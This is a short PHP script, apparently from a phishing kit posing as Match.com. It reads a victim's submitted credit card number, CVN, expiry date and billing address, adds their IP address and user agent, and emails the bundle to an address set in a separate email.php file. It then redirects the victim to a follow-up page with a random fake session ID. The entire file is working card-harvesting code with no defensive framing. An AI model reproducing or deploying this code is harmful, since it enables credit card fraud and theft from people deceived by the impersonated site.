<?php
if($_POST["name"] != "" and $_POST["ccn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Match.com Info-----------------------\n";
$message .= "|Card Holder Name : ".$_POST['name']."\n";
$message .= "|Credit card Number : ".$_POST['ccn']."\n";
$message .= "|CVN 	: ".$_POST['cvn']."\n";
$message .= "|Expiry Date  : ".$_POST['exp1'].'/'.$_POST['exp2']."\n";
$message .= "|Billing Address Line 1 : ".$_POST['address1']."\n";
$message .= "|Billing Address Line 2 : ".$_POST['address2']."\n";
$message .= "|City / Town : ".$_POST['city']."\n";
$message .= "|Country : ".$_POST['country']."\n";
$message .= "|State : ".$_POST['state']."\n";
$message .= "|Zip Code : ".$_POST['zip']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: surf3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>